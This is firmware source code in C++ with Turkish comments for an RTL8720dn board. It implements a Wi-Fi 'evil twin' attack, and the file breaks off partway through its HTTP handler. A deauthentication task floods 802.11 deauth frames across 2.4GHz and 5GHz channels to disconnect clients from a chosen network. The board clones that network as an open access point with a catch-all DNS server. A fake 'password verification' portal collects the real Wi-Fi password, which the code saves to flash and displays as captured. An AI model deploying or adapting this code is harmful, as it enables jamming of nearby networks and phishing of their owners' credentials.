// AP+STA Captive Portal — RTL8720dn (AmebaD)
// NİHAİ SÜRÜM: "Burst Modu" Maksimum Hızlandırılmış 5GHz + 2.4GHz Deauth

#include "sys_api.h"  
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "FlashMemory.h"
#include "wifi_conf.h"
#include "wifi_structures.h"
#include "FreeRTOS.h"
#include "task.h"
#include "semphr.h"

// +++ ARDUINO & C++ STL ÇAKIŞMASI ÇÖZÜMÜ +++
#undef max
#undef min
#include <vector>
// ++++++++++++++++++++++++++++++++++++++++++

// +++ LWIP VE DONANIM KÜTÜPHANELERİ +++
#include "lwip/netif.h"
#include <lwip/netifapi.h>
#include <lwip/udp.h>
#include <lwip/arch.h>
#include <lwip/def.h>

#ifndef ENC_TYPE_TKIP
#define ENC_TYPE_TKIP  2
#endif
#ifndef ENC_TYPE_CCMP
#define ENC_TYPE_CCMP  4
#endif

// LOW-LEVEL REALTEK KÜTÜPHANELERİ
extern "C" {
  extern struct netif xnetif[];
  void dhcps_init(struct netif *pnetif);
  void dhcps_deinit(void);
  int  LwIP_DHCP(uint8_t idx, uint8_t action);
  int  wext_set_mode(const char *ifname, int mode);
  int  wifi_disconnect(void);
  void LwIP_Init(void);
  int  wext_send_mgnt(const char *ifname, char *buf, uint16_t buf_len, uint16_t flags);
  int  wifi_set_channel(int channel); // Frekans Zıplaması İçin
}

// ─────────────────────────────────────────────────────────────────────────────
// ─── İÇE GÖMÜLÜ DNS SERVER ───────────────────────────────────────────────────
// ─────────────────────────────────────────────────────────────────────────────

#ifndef PACK_STRUCT_FIELD
#define PACK_STRUCT_FIELD(x) x
#endif

#ifndef PACK_STRUCT_STRUCT
#ifdef __GNUC__
#define PACK_STRUCT_STRUCT __attribute__((packed))
#else
#define PACK_STRUCT_STRUCT
#endif
#endif

#define DNS_HEADER_SIZE 12
#define DNS_SERVER_PORT 53

struct dns_hdr {
    PACK_STRUCT_FIELD(u16_t id);
    PACK_STRUCT_FIELD(u8_t flags1);
    PACK_STRUCT_FIELD(u8_t flags2);
    PACK_STRUCT_FIELD(u16_t numquestions);
    PACK_STRUCT_FIELD(u16_t numanswers);
    PACK_STRUCT_FIELD(u16_t numauthrr);
    PACK_STRUCT_FIELD(u16_t numextrarr);
} PACK_STRUCT_STRUCT;

struct DNSHeader {
    uint16_t ID;
    union {
        struct {
            uint16_t RD     : 1;
            uint16_t TC     : 1;
            uint16_t AA     : 1;
            uint16_t OPCode : 4;
            uint16_t QR     : 1;
            uint16_t RCode  : 4;
            uint16_t Z      : 3;
            uint16_t RA     : 1;
        };
        uint16_t Flags;
    };
    uint16_t QDCount;
    uint16_t ANCount;
    uint16_t NSCount;
    uint16_t ARCount;
};

struct DNSQuestion {
    const uint8_t *QName;
    uint16_t QNameLength;
    uint16_t QType;
    uint16_t QClass;
};

class DNSServer {
public:
    DNSServer() {
        _resolvedIP[0] = 192; _resolvedIP[1] = 168; _resolvedIP[2] = 4; _resolvedIP[3] = 1;
        _dns_server_pcb = NULL;
    }
    void setResolvedIP(uint8_t ip0, uint8_t ip1, uint8_t ip2, uint8_t ip3) {
        _resolvedIP[0] = ip0; _resolvedIP[1] = ip1; _resolvedIP[2] = ip2; _resolvedIP[3] = ip3;
    }
    bool requestIncludesOnlyOneQuestion(DNSHeader &dnsHeader) {
        return ntohs(dnsHeader.QDCount) == 1 && dnsHeader.ANCount == 0 && dnsHeader.NSCount == 0 && dnsHeader.ARCount == 0;
    }
    void begin();
    void stop();
    uint8_t _resolvedIP[4];
private:
    struct udp_pcb *_dns_server_pcb;
    static void packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *udp_packet_buffer, struct ip_addr *sender_addr, uint16_t sender_port);
};

static DNSServer* dnsServerInstance = NULL;

void DNSServer::begin() {
    dnsServerInstance = this;
    struct udp_pcb *pcb;
    for (pcb = udp_pcbs; pcb != NULL; pcb = pcb->next) {
        if (pcb->local_port == DNS_SERVER_PORT) udp_remove(pcb);
    }
    for (int _retry = 0; _retry < 3 && !_dns_server_pcb; _retry++) {
        _dns_server_pcb = udp_new();
        if (!_dns_server_pcb) delay(300);
    }
    if (!_dns_server_pcb) return;
    udp_bind(_dns_server_pcb, IP4_ADDR_ANY, DNS_SERVER_PORT);
    udp_recv(_dns_server_pcb, (udp_recv_fn)packetHandler, NULL);
}

void DNSServer::stop() {
    if (_dns_server_pcb) {
        udp_remove(_dns_server_pcb);
        _dns_server_pcb = NULL;
        dnsServerInstance = NULL;
    }
}

void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *udp_packet_buffer, struct ip_addr *sender_addr, uint16_t sender_port) {
    (void)arg;
    if (!dnsServerInstance || !udp_packet_buffer || udp_packet_buffer->len < DNS_HEADER_SIZE) {
        if (udp_packet_buffer) pbuf_free(udp_packet_buffer);
        return;
    }

    DNSHeader dnsHeader;
    DNSQuestion dnsQuestion;
    memcpy(&dnsHeader, udp_packet_buffer->payload, DNS_HEADER_SIZE);
    
    if (dnsServerInstance->requestIncludesOnlyOneQuestion(dnsHeader)) {
        if (udp_packet_buffer->len <= DNS_HEADER_SIZE) { pbuf_free(udp_packet_buffer); return; }
        
        uint16_t offset = DNS_HEADER_SIZE;
        uint16_t nameLength = 0;
        while (offset < udp_packet_buffer->len && ((uint8_t*)udp_packet_buffer->payload)[offset] != 0) {
            nameLength++; offset++;
        }
        if (offset >= udp_packet_buffer->len - 4) { pbuf_free(udp_packet_buffer); return; }
        
        offset++; nameLength++;
        dnsQuestion.QName = (uint8_t *)udp_packet_buffer->payload + DNS_HEADER_SIZE;
        dnsQuestion.QNameLength = nameLength;
        int sizeUrl = static_cast<int>(nameLength);

        struct dns_hdr *hdr = (struct dns_hdr *)udp_packet_buffer->payload;
        struct pbuf *p = pbuf_alloc(PBUF_TRANSPORT, sizeof(struct dns_hdr) + sizeUrl + 20, PBUF_RAM);
        if (p) {
            struct dns_hdr *rsp_hdr = (struct dns_hdr *)p->payload;
            rsp_hdr->id = hdr->id;
            rsp_hdr->flags1 = 0x85;
            rsp_hdr->flags2 = 0x80;
            rsp_hdr->numquestions = PP_HTONS(1);
            rsp_hdr->numanswers = PP_HTONS(1);
            rsp_hdr->numauthrr = PP_HTONS(0);
            rsp_hdr->numextrarr = PP_HTONS(0);

            uint8_t *responsePtr = (uint8_t *)rsp_hdr + sizeof(struct dns_hdr);
            memcpy(responsePtr, dnsQuestion.QName, sizeUrl);
            responsePtr += sizeUrl;
            *(uint16_t *)responsePtr = PP_HTONS(1);
            *(uint16_t *)(responsePtr + 2) = PP_HTONS(1);
            responsePtr[4] = 0xc0; responsePtr[5] = 0x0c;
            *(uint16_t *)(responsePtr + 6) = PP_HTONS(1);
            *(uint16_t *)(responsePtr + 8) = PP_HTONS(1);
            *(uint32_t *)(responsePtr + 10) = PP_HTONL(60);
            *(uint16_t *)(responsePtr + 14) = PP_HTONS(4);
            memcpy(responsePtr + 16, dnsServerInstance->_resolvedIP, 4);

            udp_sendto(udp_pcb, p, sender_addr, sender_port);
            pbuf_free(p);
        }
    } else {
        struct pbuf *p = pbuf_alloc(PBUF_TRANSPORT, udp_packet_buffer->len, PBUF_RAM);
        if (p) {
            memcpy(p->payload, udp_packet_buffer->payload, udp_packet_buffer->len);
            struct dns_hdr *dns_rsp = (struct dns_hdr *)p->payload;
            dns_rsp->flags1 |= 0x80;
            dns_rsp->flags2 = 0x05;
            udp_sendto(udp_pcb, p, sender_addr, sender_port);
            pbuf_free(p);
        }
    }
    pbuf_free(udp_packet_buffer);
}

// ─────────────────────────────────────────────────────────────────────────────
// ─── ANA PORTAL KODLARI ──────────────────────────────────────────────────────
// ─────────────────────────────────────────────────────────────────────────────

#define DHCP_START   1
#define DHCP_STOP    0
#define IW_MODE_INFRA 2
#define WLAN0_NAME   "wlan0"

#define AP_INITIAL_SSID  "X"
#define AP_INITIAL_PASS  "20192019"
#define AP_IP_ADDR       "192.168.4.1"
#define SERVER_PORT      80

#define FLASH_MAGIC      0xAB
#define MAX_SSID_LEN     64
#define MAX_PASS_LEN     64
#define FLASH_BUF_SIZE   256
#define FLASH_OFFSET     0x00100000 

struct SavedCredentials {
  uint8_t magic;
  char    ssid[MAX_SSID_LEN];
  char    pass[MAX_PASS_LEN];
};

struct NetworkInfo {
  String  ssid;
  uint8_t bssid[6]; 
  int32_t rssi;
  uint8_t enc;
  int32_t channel; 
};

typedef enum { CS_IDLE = 0, CS_RUNNING = 1, CS_DONE_OK = 2, CS_DONE_FAIL = 3 } ConnStatus;
volatile ConnStatus conn_status = CS_IDLE;

typedef enum { SCAN_IDLE = 0, SCAN_RUNNING = 1, SCAN_DONE = 2 } ScanStatus;
volatile ScanStatus scan_status = SCAN_IDLE;

// GLOBAL DEĞİŞKENLER
bool ap_switched = false;
bool pending_ap_switch = false;
unsigned long revert_time = 0; 

char target_ssid[MAX_SSID_LEN] = {0};
uint8_t target_bssid[6] = {0}; 
int32_t target_channel = 6;
uint8_t target_enc = ENC_TYPE_CCMP;

volatile bool deauth_active = false; 

WiFiServer server(SERVER_PORT); 
DNSServer  dnsServer;

std::vector<NetworkInfo> networks;
SemaphoreHandle_t networks_mutex;
SemaphoreHandle_t raw_scan_sem = NULL;

char saved_ssid[MAX_SSID_LEN]   = {0};
char saved_pass[MAX_PASS_LEN]   = {0};
char pending_ssid[MAX_SSID_LEN] = {0};
char pending_pass[MAX_PASS_LEN] = {0};
uint8_t pending_enc             = ENC_TYPE_CCMP;
bool sta_connected  = false;
String conn_result  = "";

unsigned long last_scan_ms = 0;
#define RESCAN_INTERVAL_MS  30000UL

String urlDecode(String input) {
  String output = "";
  for (int i = 0; i < (int)input.length(); i++) {
    if (input[i] == '+') output += ' ';
    else if (input[i] == '%' && i + 2 < (int)input.length()) {
      char hex[3] = { input[i + 1], input[i + 2], 0 };
      output += (char)strtol(hex, nullptr, 16);
      i += 2;
    } else output += input[i];
  }
  return output;
}

void loadCredentials() {
  FlashMemory.read();
  SavedCredentials creds;
  memcpy(&creds, FlashMemory.buf, sizeof(creds));
  if (creds.magic == FLASH_MAGIC && creds.ssid[0] != 0) {
    strncpy(saved_ssid, creds.ssid, MAX_SSID_LEN - 1);
    strncpy(saved_pass, creds.pass, MAX_PASS_LEN - 1);
  }
}

void saveCredentials(const char *ssid, const char *pass) {
  FlashMemory.read(); 
  SavedCredentials creds;
  creds.magic = FLASH_MAGIC;
  memset(creds.ssid, 0, MAX_SSID_LEN);
  memset(creds.pass, 0, MAX_PASS_LEN);
  strncpy(creds.ssid, ssid, MAX_SSID_LEN - 1);
  strncpy(creds.pass, pass, MAX_PASS_LEN - 1);
  memcpy(FlashMemory.buf, &creds, sizeof(creds));
  FlashMemory.update();
  delay(1000); 
}

rtw_security_t mapSecurity(uint8_t enc) {
  switch (enc) {
    case ENC_TYPE_NONE: return RTW_SECURITY_OPEN;
    case ENC_TYPE_WEP:  return RTW_SECURITY_WEP_PSK;
    case ENC_TYPE_TKIP: return RTW_SECURITY_WPA_TKIP_PSK;
    default:            return RTW_SECURITY_WPA2_AES_PSK;
  }
}

// ─── AĞ TARAYICI ─────────────────────────────────────────────────────────────
static std::vector<NetworkInfo> scan_temp;

rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
  if (malloced_scan_result->scan_complete != RTW_TRUE) {
    rtw_scan_result_t *record = &malloced_scan_result->ap_details;
    NetworkInfo net;
    char ssid_str[33] = {0};
    memcpy(ssid_str, record->SSID.val, record->SSID.len);
    net.ssid = String(ssid_str);
    net.rssi = record->signal_strength;
    net.channel = record->channel; 
    
    // Hedefin MAC Adresini Oku
    memcpy(net.bssid, record->BSSID.octet, 6);
    
    if (record->security == RTW_SECURITY_OPEN) net.enc = ENC_TYPE_NONE;
    else if (record->security == RTW_SECURITY_WEP_PSK) net.enc = ENC_TYPE_WEP;
    else if (record->security == RTW_SECURITY_WPA_TKIP_PSK || record->security == RTW_SECURITY_WPA_AES_PSK || record->security == RTW_SECURITY_WPA_MIXED_PSK) net.enc = ENC_TYPE_TKIP;
    else net.enc = ENC_TYPE_CCMP;
    
    if (net.ssid.length() > 0) {
      bool dup = false;
      for (auto &existing : scan_temp) {
        if (existing.ssid == net.ssid) {
          dup = true;
          if (net.rssi > existing.rssi) {
            existing.rssi = net.rssi;
            existing.channel = net.channel;
            existing.enc = net.enc;
            memcpy(existing.bssid, net.bssid, 6); 
          }
          break;
        }
      }
      if (!dup) scan_temp.push_back(net);
    }
  } else {
    if (raw_scan_sem != NULL) xSemaphoreGive(raw_scan_sem);
  }
  return RTW_SUCCESS;
}

void scanNetworkTask(void *param) {
  (void)param;
  scan_temp.clear();
  if (raw_scan_sem == NULL) raw_scan_sem = xSemaphoreCreateBinary();
  if (wifi_scan_networks(raw_scan_handler, NULL) == RTW_SUCCESS) {
    xSemaphoreTake(raw_scan_sem, pdMS_TO_TICKS(6000));
  }
  if (networks_mutex) {
    xSemaphoreTake(networks_mutex, portMAX_DELAY);
    networks = scan_temp;
    xSemaphoreGive(networks_mutex);
  }
  scan_temp.clear();
  last_scan_ms = millis();
  scan_status = SCAN_DONE;
  vTaskDelete(NULL);
}

void startScan() {
  if (scan_status == SCAN_RUNNING) return;
  if (conn_status == CS_RUNNING) return;
  scan_status = SCAN_RUNNING;
  xTaskCreate(scanNetworkTask, "scan", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
}

// ─── BAĞLANTI GÖREVİ ─────────────────────────────────────────────────────────
void wifiConnectTask(void *param) {
  (void)param;
  bool is_open = (mapSecurity(pending_enc) == RTW_SECURITY_OPEN);
  int  pass_len = is_open ? 0 : (int)strlen(pending_pass);
  rtw_security_t try_sec[] = { mapSecurity(pending_enc), RTW_SECURITY_WPA2_AES_PSK, RTW_SECURITY_WPA2_MIXED_PSK };
  int try_count = is_open ? 1 : 3;
  int ret = RTW_ERROR;

  for (int t = 0; t < try_count; t++) {
    wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(300));
    wext_set_mode(WLAN0_NAME, IW_MODE_INFRA);
    vTaskDelay(pdMS_TO_TICKS(200));
    ret = wifi_connect((char *)pending_ssid, try_sec[t], (char *)pending_pass, (int)strlen(pending_ssid), pass_len, -1, NULL);
    if (ret == RTW_SUCCESS) {
      vTaskDelay(pdMS_TO_TICKS(500));
      if (wifi_is_connected_to_ap() == RTW_SUCCESS) break;
      else ret = RTW_ERROR;
    }
    if (t < try_count - 1) vTaskDelay(pdMS_TO_TICKS(2000));
  }

  if (ret == RTW_SUCCESS) {
    vTaskDelay(pdMS_TO_TICKS(500)); 
    conn_status = CS_DONE_OK;
  } else {
    conn_status = CS_DONE_FAIL;
  }
  vTaskDelete(NULL);
}

void startConnectTask() {
  if (conn_status == CS_RUNNING) return;
  conn_status = CS_RUNNING;
  xTaskCreate(wifiConnectTask, "wconn", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
}

// ─── BURST MODU: MAKSİMUM HIZLANDIRILMIŞ 5GHz + 2.4GHz GÖREVİ ────────────────
void deauthTask(void *param) {
  (void)param;
  
  uint8_t deauth_frame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Doldurulacak)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Doldurulacak)
    0x00, 0x00,
    0x07, 0x00 // Reason Code 7
  };

  // Tüm 5GHz kanallarını tek seferde vurmak için liste
  int common_5g_channels[] = {36, 40, 44, 48, 149};

  Serial.println("\n[Deauth] BURST MODU AKTİF! 5GHz'e isik hizinda kursun yagiyor...");

  while (deauth_active) {
    // === ADIM 1: WEB SUNUCUSUNU YAŞATMAK İÇİN 2.4GHz'e DÖN VE BEKLE ===
    wifi_set_channel(target_channel);
    
    // 2.4GHz Fuzzing Atışı
    for (int offset = -2; offset <= 2; offset++) {
        uint8_t temp_bssid[6];
        memcpy(temp_bssid, target_bssid, 6);
        temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);

        memcpy(&deauth_frame[10], temp_bssid, 6);
        memcpy(&deauth_frame[16], temp_bssid, 6);

        // Hızlı çift atış
        wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
        wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
        vTaskDelay(pdMS_TO_TICKS(1)); // Minimum çip koruma molası
    }
    
    // DİKKAT: Cihazın Captive Portal sayfasını (Sahte Ağı) telefonda ayakta tutabilmesi 
    // ve DNS isteklerine cevap verebilmesi için bu kısa dinlenme (150ms) ŞARTTIR.
    vTaskDelay(pdMS_TO_TICKS(150)); 

    // === ADIM 2: BÜTÜN 5GHz KANALLARINA HIZLI (BURST) BASKIN ===
    // Bekleme süresi koymadan tüm 5GHz kanallarına saniyeden kısa sürede girip çıkacak.
    for(int c=0; c < 5; c++) {
        wifi_set_channel(common_5g_channels[c]);
        
        for (int offset = -2; offset <= 2; offset++) {
            uint8_t temp_bssid[6];
            memcpy(temp_bssid, target_bssid, 6);
            temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);

            memcpy(&deauth_frame[10], temp_bssid, 6);
            memcpy(&deauth_frame[16], temp_bssid, 6);

            // Her 5GHz varyasyonuna anlık 3 mermi (vTaskDelay olmadan, ardışık!)
            wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
            wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
            wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
            
            // Watchdog Timer (WDT) çipi sıfırlamasın diye 1 milisaniye koruma
            vTaskDelay(pdMS_TO_TICKS(1)); 
        }
    }
    // Tur biter bitmez döngü başa döner ve anında 2.4GHz'e geri zıplar.
  }
  
  Serial.println("[Deauth] Saldiri Basariyla Sonlandirildi.");
  vTaskDelete(NULL);
}
// ─────────────────────────────────────────────────────────────────────────────

// ─── GÖRSELLER VE YÖNLENDİRME ────────────────────────────────────────────────
String rssiBar(int32_t rssi) {
  if (rssi > -50) return "&#9608;&#9608;&#9608;&#9608; Mukemmel";
  if (rssi > -65) return "&#9608;&#9608;&#9608;&#9617; Iyi";
  if (rssi > -75) return "&#9608;&#9608;&#9617;&#9617; Orta";
  return "&#9608;&#9617;&#9617;&#9617; Zayif";
}

String buildRedirect() {
  String r = "HTTP/1.1 302 Found\r\nLocation: http://";
  r += AP_IP_ADDR;
  r += "/\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
  return r;
}

String parsePostParam(const String &body, const String &key) {
  int idx = body.indexOf(key + "=");
  if (idx == -1) return "";
  int start = idx + key.length() + 1;
  int end   = body.indexOf('&', start);
  if (end == -1) end = body.length();
  return urlDecode(body.substring(start, end));
}

// CSS VERİSİ
static const char CSS_STR[] PROGMEM =
  "<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#1a1a2e;color:#eee;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}"
  ".card{background:#16213e;border-radius:14px;padding:24px;width:100%;max-width:500px;box-shadow:0 8px 32px rgba(0,0,0,.4)}"
  "h1{font-size:1.4rem;color:#e94560;text-align:center;margin-bottom:6px}.sub{text-align:center;font-size:.85rem;color:#aaa;margin-bottom:20px}"
  ".status-box{border-radius:8px;padding:10px 14px;margin-bottom:18px;font-size:.9rem;font-weight:bold}.ok{background:#0a3d2e;border:1px solid #27ae60;color:#2ecc71}.err{background:#3d0a0a;border:1px solid #e74c3c;color:#e74c3c}.wait{background:#0a2040;border:1px solid #3498db;color:#5dade2}"
  ".conn-status{border-radius:8px;padding:12px;margin-bottom:16px;font-size:.9rem;background:#0d1b2e;border:1px solid #2980b9;line-height:1.4}h2{font-size:1rem;color:#ccc;margin-bottom:10px;border-bottom:1px solid #2c3e50;padding-bottom:6px}"
  ".net-list{list-style:none;margin-bottom:18px;max-height:250px;overflow-y:auto}.net-item{display:flex;align-items:center;padding:10px 12px;border-radius:8px;margin-bottom:6px;cursor:pointer;border:2px solid transparent;background:#0f3460;transition:border-color .2s}.net-item:hover{border-color:#e94560}"
  ".net-item input[type=radio]{margin-right:10px;accent-color:#e94560;width:18px;height:18px;flex-shrink:0}.net-info{flex:1;min-width:0}.net-name{font-weight:bold;font-size:.95rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.net-meta{font-size:.75rem;color:#aaa;margin-top:2px}"
  ".pass-wrap{margin-bottom:16px}label{display:block;font-size:.85rem;color:#aaa;margin-bottom:6px}input[type=password]{width:100%;padding:10px 12px;border-radius:7px;border:1px solid #2c3e50;background:#0d1b2e;color:#eee;font-size:.95rem;outline:none}input:focus{border-color:#e94560}"
  ".show-pass{font-size:.8rem;color:#aaa;margin-top:6px;cursor:pointer;user-select:none}button{width:100%;padding:13px;border:none;border-radius:8px;background:#e94560;color:#fff;font-size:1rem;font-weight:bold;cursor:pointer;margin-bottom:10px}.btn-blue{background:#2980b9}"
  ".spinner{display:inline-block;width:16px;height:16px;border:3px solid #5dade2;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:6px}@keyframes spin{to{transform:rotate(360deg)}}"
  ".footer{text-align:center;font-size:.75rem;color:#555;margin-top:8px}</style>";

void sendChunkedCSS(WiFiClient &client) {
  const char *p = CSS_STR;
  while (*p) {
    int len = 0;
    while (p[len] != '\0' && len < 200) len++;
    client.write((const uint8_t *)p, len);
    client.flush();
    delay(5);
    p += len;
  }
}

// ─── SAYFALAR ────────────────────────────────────────────────────────────────
void sendStartPage(WiFiClient &client) {
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Guvenli Kurulum - Ag Secimi</title>");
  sendChunkedCSS(client);
  client.print("</head><body><div class='card'><h1>&#128274; Guvenli Kurulum</h1><p class='sub'>Lutfen hedef aginizi listeden secin</p>");

  if (scan_status == SCAN_RUNNING) {
      client.print("<div class='status-box wait'>&#128225; Cevredeki aglar araniyor...</div>");
  }

  if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
  client.print("<h2>&#128225; Kullanilabilir Aglar ("); client.print(networks.size()); client.print(")</h2><form method='POST' action='/start_ap'><ul class='net-list'>");

  for (int i = 0; i < (int)networks.size(); i++) {
    String safe = networks[i].ssid;
    safe.replace("&", "&amp;"); safe.replace("<", "&lt;"); safe.replace("'", "&#39;"); safe.replace("\"", "&quot;");
    
    client.print("<li class='net-item' onclick=\"document.getElementById('r"); client.print(i); client.print("').checked=true\">");
    client.print("<input type='radio' name='ssid' id='r"); client.print(i); client.print("' value='"); client.print(safe); client.print("' required>");
    client.print("<div class='net-info'><div class='net-name'>"); client.print(safe); client.print("</div>");
    client.print("<div class='net-meta'>"); client.print(rssiBar(networks[i].rssi)); client.print(" &nbsp;|&nbsp; Kanal: "); client.print(networks[i].channel); client.print("</div></div></li>");
  }
  if (networks.empty() && scan_status != SCAN_RUNNING) {
      client.print("<li style='padding:16px;text-align:center;color:#aaa;'>Ag bulunamadi.</li>");
  }
  if (networks_mutex) xSemaphoreGive(networks_mutex);

  client.print("</ul><button type='submit'>Kurulumu Baslat</button></form>");
  client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue'>&#8635; Yeniden Ara</button></form>");

  if (strlen(saved_ssid) > 0) {
    client.print("<div style='background:#0a2040;border:1px solid #3498db;border-radius:8px;padding:12px;margin-top:16px;'>");
    client.print("<h3 style='font-size:0.9rem;color:#5dade2;margin-bottom:8px;text-align:center;'>&#128190; Yakalanan Ag Sifresi</h3>");
    client.print("<div style='display:flex;justify-content:space-between;align-items:center;background:#0d1b2e;padding:10px;border-radius:6px;'>");
    client.print("<div style='display:flex;flex-direction:column;font-size:0.85rem;'>");
    client.print("<span style='color:#ccc;'><b>Ag:</b> <span style='color:#fff;'>"); client.print(saved_ssid); client.print("</span></span>");
    client.print("<span style='color:#ccc;margin-top:4px;'><b>Sifre:</b> <span style='color:#2ecc71;'>"); client.print(saved_pass); client.print("</span></span>");
    client.print("</div>");
    client.print("<form method='POST' action='/delete_cred' style='margin:0;'>");
    client.print("<button type='submit' style='background:#e74c3c;color:#fff;border:none;padding:8px 12px;border-radius:6px;font-size:0.8rem;cursor:pointer;'>Sil</button>");
    client.print("</form></div></div>");
  }
  client.print("<div class='footer'>Mevcut Yonetim Agi: X</div></div></body></html>");
}

void sendSwitchingPage(WiFiClient &client) {
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Ag Klonlaniyor</title>");
  client.print("<style>body{font-family:Arial,sans-serif;background:#1a1a2e;color:#eee;text-align:center;padding:50px 20px;} b{color:#e94560;}</style></head><body>");
  client.print("<h2 style='color:#e94560;'>&#9888; 'X' Agi Kapatiliyor...</h2>");
  client.print("<p style='color:#aaa;font-size:18px;margin-top:20px;line-height:1.6'>Cihaz klonlama moduna gecti! Lutfen Wi-Fi ayarlariniza gidin ve yeni acilan sifresiz <b>");
  client.print(target_ssid);
  client.print("</b> agina baglanin.</p></body></html>");
}

void sendPortalPage(WiFiClient &client, bool show_result) {
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>WiFi Sifre Onayi</title>");
  sendChunkedCSS(client);

  client.print("</head><body><div class='card'><h1>&#128273; WiFi Sifre Dogrulamasi</h1>");
  client.print("<p class='sub'>Lutfen taklit edilen bu agin gercek anahtarini girin</p>");

  if (conn_status == CS_RUNNING) {
      client.print("<div class='status-box wait'><span class='spinner'></span>Istasyona Baglaniliyor...</div>");
  } else if (show_result) {
    if (conn_result == "ok") client.print("<div class='status-box ok'>&#10003; Baglanti basarili! Kurulum tamamlandi.</div>");
    else if (conn_result == "fail") client.print("<div class='status-box err'>&#10007; Baglanti basarisiz. Sifreyi kontrol edin.</div>");
  }

  client.print("<div class='conn-status'>Secilen Baglanti Agi: <b>"); client.print(target_ssid);
  client.print("</b><br><small style='color:#aaa'>Frekans Eslemesi (Kanal): "); client.print(target_channel); client.print("</small></div>");
  
  // SADE ŞİFRE GİRİŞ FORMU
  client.print("<form method='POST' action='/connect'><div class='pass-wrap'><label for='pass'>Sifre Giriniz</label>");
  client.print("<input type='password' id='pass' name='pass' placeholder='Sifreyi buraya yazin...' autocomplete='off' required>");
  client.print("<div class='show-pass' onclick=\"var p=document.getElementById('pass');p.type=p.type=='password'?'text':'password'\">&#128065; Goster/Gizle</div></div>");
  client.print("<button type='submit'>&#128273; Onayla ve Baglan</button></form>");
  
  if (conn_status == CS_RUNNING) {
      client.print("<script>function tryR(){fetch('/',{cache:'no-store',signal:AbortSignal.timeout(3000)}).then(function(r){if(r.ok){window.location.href='/';}else{setTimeout(tryR,2000);}}).catch(function(){setTimeout(tryR,2000);});}setTimeout(tryR,3000);</script>");
  }
  
  client.print("<div class='footer'>Hedef Maskeleme Aktif</div></div></body></html>");
}

// ─── HTTP İŞLEYİCİSİ ─────────────────────────────────────────────────────────
void handleClient(WiFiClient &client) {
  unsigned long timeout = millis() + 3000;
  String request = ""; request.reserve(512);

  while (client.connected() && millis() < timeout) {
    if (client.available()) {
      char c = client.read(); request += c;
      if (request.endsWith("\r\n\r\n")) break;
    } else delay(1);
  }
  if (request.length() == 0) return;

  String body = ""; int content_len = 0;
  int cl_idx = request.indexOf("Content-Length: ");
  if (cl_idx != -1) {
    content_len = request.substring(cl_idx + 16, request.indexOf("\r\n", cl_idx)).toInt();
    if (content_len > 256) content_len = 256;
  }
  if (content_len > 0) {
    body.reserve(content_len); int br = 0; timeout = millis() + 2000;
    while (br < content_len && millis() < timeout) {
      if (client.available()) { body += (char)client.read(); br++; }
      else delay(1);
    }
  }

  String path = "";
  int ps = request.indexOf(' ') + 1; int pe = request.indexOf(' ', ps);
  if (ps > 0 && pe > ps) path = request.substring(ps, pe);
  if (path.indexOf('?') != -1) path = path.substring(0, path.indexOf('?'));

  String hostHeader = "";
  int hi = request.indexOf("Host: ");
  if (hi != -1) {
    hostHeader = request.substring(hi + 6, request.indexOf("\r\n", hi + 6));
    hostHeader.trim();
    if (hostHeader.indexOf(':') != -1) hostHeader = hostHeader.substring(0, hostHeader.indexOf(':'));
  }

  bool path_is_captive = path.indexOf("hotspot-detect") != -1 || path.indexOf("generate_204") != -1 || path.indexOf("redirect") != -1;
  bool host_is_foreign = (hostHeader.length() > 0 && hostHeader != AP_IP_ADDR);

  if (path_is_captive || host_is_foreign) {
    client.print(buildRedirect()); 
    client.flush();
    delay(10);
    return;
  }

  if (!ap_switched) {
    if (request.startsWith("POST") && path == "/delete_cred") {
      memset(saved_ssid, 0, MAX_SSID_LEN);
      memset(saved_pass, 0, MAX_PASS_LEN);
      saveCredentials("", ""); 
      sendStartPage(client);   
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/rescan") {
      if (scan_status != SCAN_RUNNING) startScan();
      sendStartPage(client); 
      client.flush();
      return;
    }
    
    if (request.startsWith("POST") && path == "/start_ap") {
      String sel_ssid = parsePostParam(body, "ssid");
      if (sel_ssid.length() == 0) { sendStartPage(client); return; }
      
